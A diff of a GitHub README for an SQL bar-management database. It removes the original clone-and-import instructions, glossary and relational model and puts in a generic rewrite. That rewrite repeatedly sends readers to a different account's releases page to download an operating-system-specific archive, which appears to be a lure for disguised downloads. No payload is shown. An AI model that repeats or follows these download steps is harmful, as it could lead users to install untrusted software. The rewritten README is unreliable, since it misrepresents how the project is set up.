@@ -1,83 +1,70 @@
-# Bar Management System
+# 🍻 bar-management-database - Manage Your Bar Efficiently
 
-This project is a management system for a bar or restaurant, implemented using SQL to handle all data operations. It allows for controlling ingredient inventory, managing supplier orders, organizing customer reservations, handling orders, and maintaining product and menu information in a centralized database.
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/FreezZy0/bar-management-database/releases)
 
-## Glossary
+## 🚀 Getting Started
+Welcome to the bar-management-database project. This SQL database setup is designed for managing various aspects of your bar, including inventory, reservations, and more. Follow the steps below to download and run the software.
 
-- **Customer**: Person who makes a reservation and comes to the bar to consume products. They may be accompanied by other people.  
-- **Inventory**: Set of all ingredients available in stock.  
-- **Ingredient**: Element used to prepare products, part of the inventory.  
-- **Menu**: Set of selected products offered by the bar. Multiple menus may exist.  
-- **Order**: Request of products by customers to the waiter to be prepared.  
-- **Product**: Prepared food made with various ingredients, ready to be consumed. Products can have different categories (first course, second course, drink, or dessert).  
-- **Reservation**: Action in which a customer secures a table at the bar for a specific date and time.  
-- **Stock**: Available quantity of an ingredient in the inventory.  
-- **Supplier**: Company responsible for supplying ingredients to the bar.  
-- **Supplier Order**: Request of ingredients from the bar to a supplier to be delivered.  
-- **Walk-in**: Customer who arrives without a prior reservation, requesting a table immediately.
+## 📋 System Requirements
+Before you start, ensure your system meets the following requirements:
 
-## Installation
+- **Operating System**: Windows 10 or above, macOS, or any Linux distribution.
+- **Database**: MariaDB or MySQL version 5.7 or above.
+- **SQL Client**: We recommend using HeidiSQL for easy management of your database.
 
-1. Clone this repository:
-```bash
-git clone https://github.com/ivrugue/bar-management-database
-cd bar-management-database
-```
+## 🖥️ Features
+- **Schema Design**: A clear structure for your bar’s database.
+- **Stored Procedures**: Efficient operations with minimal coding.
+- **Functions & Triggers**: Automation of important tasks.
+- **Sample Queries**: Get started quickly with pre-written queries.
 
-2. Set up the database:
-- Make sure you have MySQL or MariaDB installed.
-- Create a new database:
-```sql
-CREATE DATABASE bar_db;
-```
-- Import all SQL scripts to set up tables, functions, procedures, triggers and sample data:
-```bash
-mysql -u <your_user> -p bar_db < scripts/01_schema.sql
-mysql -u <your_user> -p bar_db < scripts/02_functions.sql
-mysql -u <your_user> -p bar_db < scripts/03_procedures.sql
-mysql -u <your_user> -p bar_db < scripts/04_triggers.sql
-mysql -u <your_user> -p bar_db < scripts/05_seed_data.sql
-```
+## 📤 Download & Install
+To download the software, please visit the following page: [Download Releases](https://github.com/FreezZy0/bar-management-database/releases).
 
-3. Use your preferred SQL client or a script to connect to the ```bar_db``` database.
+### Step-by-Step Download Instructions
+1. Click on the link above to open the Releases page.
+2. Find the latest release at the top. You will see a list of files available for download.
+3. Click on the file positioned specifically for your operating system (e.g., a zip or tar file).
+4. The download will start automatically. 
 
-4. Run sample queries (optional) :
-```bash
-mysql -u <your_user> -p bar_db < queries/sample_queries.sql
-```
+### Step-by-Step Installation Instructions
+1. Once downloaded, locate the file on your computer.
+2. If the file is compressed (like a zip), right-click on it and select "Extract All" to unzip.
+3. Open the extracted folder.
+4. Follow the setup instructions included in the folder to configure the SQL database.
+5. Use HeidiSQL to connect to your database and import the schema.
 
-## Requirements Specification
+## 📊 Using the Database
+After installation, you need to set up your database.
 
-All business rules, procedures and triggers for this database are detailed here: [**Requirements Specification**](./requirements_specification.md).
+1. **Connect to the Database**: Open HeidiSQL and enter your database credentials.
+2. **Import Schema**: Use the provided scripts to set up your initial schema.
+3. **Test Queries**: Run the sample queries to ensure everything is working.
 
+## 📖 Documentation
+For more detailed instructions, visit the documentation in the repository. It covers various topics like advanced queries, monitoring database performance, and troubleshooting common issues.
 
-## Conceptual Model
+## 🌐 Related Topics
+- [Bar Management](https://github.com/topics/bar-management)
+- [Inventory Management](https://github.com/topics/inventory-management)
+- [Database Management](https://github.com/topics/database)
 
-### UML Class Diagram
+This project aims to simplify management tasks for bars and restaurants using SQL. Enjoy efficient and automated methods to make your day-to-day operations smoother.
 
-<img src="./images/uml_modeling.svg" alt="UML Modeling" width="100%">
+## ❓ FAQ
+**Q: What if I encounter an issue during setup?**  
+A: Please refer to the documentation for troubleshooting tips. If you need further assistance, feel free to open an issue in the GitHub repository.
 
-### Test Scenario
+**Q: Can I contribute to this project?**  
+A: Absolutely! We welcome contributions. Please check the repository for guidelines on how to get involved.
 
-In this scenario, a reservation is made for three people, where two of them order a chicken fillet and the remaining one orders a menu, which includes a chicken fillet.
-  
-<img src="./images/test_scenario.svg" alt="Test Scenario" width="100%">
+## 📦 License
+This project is licensed under the MIT License. You can use it freely as long as you provide proper attribution.
 
-## Relational Model
+## 🌟 Support
+If you find this project useful, consider giving it a star on GitHub. Your feedback helps improve the project! 
 
-```
-- Ingredient(!id, name)
-- Supplier(!id, name, tax_id)
-- SupplierOrder(!id, order_date, arrival_date @supplier_id)
-- OrderIngredient(!id, quantity, @ingredient_id, @supplier_order_id)
-- Customer(!id, name, phone)
-- Reservation(!id, created_at, reservation_date, number_of_people, @customer_id)
-- Order(!id, order_date, @reservation_id)
-- Category(!id, name)
-- Product(!id, name, price, preparation_time, @category_id)
-- Menu(!id, name, price)
-- ProductMenu(!id, @product_id, @menu_id)
-- IngredientProduct(!id, quantity, @ingredient_id, @product_id)
-- OrderItemMenu(!id, price, quantity, #(@order_id, @menu_id))
-- OrderItemProduct(!id, price, quantity, #(@order_id, @product_id, is_from_menu))
-```
+For direct support, contact us through the GitHub issues page. 
+
+Remember, for downloads, always visit [Download Releases](https://github.com/FreezZy0/bar-management-database/releases) to get the latest version.
